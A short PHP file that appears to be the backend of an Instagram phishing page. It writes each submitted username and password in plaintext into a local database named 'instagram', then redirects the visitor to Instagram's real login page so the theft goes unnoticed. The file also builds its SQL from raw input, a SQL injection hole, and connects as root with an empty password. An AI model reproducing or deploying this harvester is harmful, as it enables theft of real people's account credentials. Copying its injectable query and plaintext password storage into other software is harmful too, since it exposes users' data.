<?php

function ConnectDB()
{
    $DB = new mysqli("localhost", "root", "", "instagram");
    if ($DB->connect_error) {
        die("Connection failed: " . $DB->connect_error);
    }
    return $DB;
}

function register($user, $password)
{
    $DB = ConnectDB();
    $sql = "INSERT INTO users (user, password)
    VALUES ('$user', '$password')";
    if ($DB->query($sql) === true) {
        header("location:https://www.instagram.com/accounts/login/");
        exit;
    }
    $DB->close();
}